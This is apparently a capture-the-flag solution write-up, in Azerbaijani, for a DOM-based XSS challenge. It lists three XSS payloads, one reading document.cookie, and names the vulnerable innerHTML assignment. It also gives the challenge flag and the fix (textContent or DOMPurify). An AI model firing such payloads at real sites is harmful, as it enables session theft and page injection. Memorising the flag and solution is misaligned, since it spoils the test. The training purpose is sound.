# Challenge 1 — DOM-based XSS (Asan)

## Məqsəd
URL parametrindən gələn dəyəri sanitizasiya olmadan HTML-ə inject etmək.

## Həll yolu
1. `/search` route-unu tap (naviqasiyada yoxdur — JS bundle analiz etmək lazımdır)
2. URL-ə XSS payload yerləşdir:
   ```
   /search?q=<img src=x onerror=alert('XSS-CTF-1')>
   /search?q=<script>alert(document.cookie)</script>
   /search?q=<svg onload=alert('XSS')>
   ```

## Zəiflik yeri
`app/search/page.tsx` — `resultRef.current.innerHTML = query`

## CTF Flag
`CTF{dom_xss_innerHTML_unsanitized}`

## Real dünya analoquu
OWASP Top 10: A03:2021 — Injection
Istifadəçi daxil etdiyi məlumat bilavasitə DOM-a yazılır.
Düzgün yanaşma: `textContent` istifadəsi və ya DOMPurify ilə sanitizasiya.
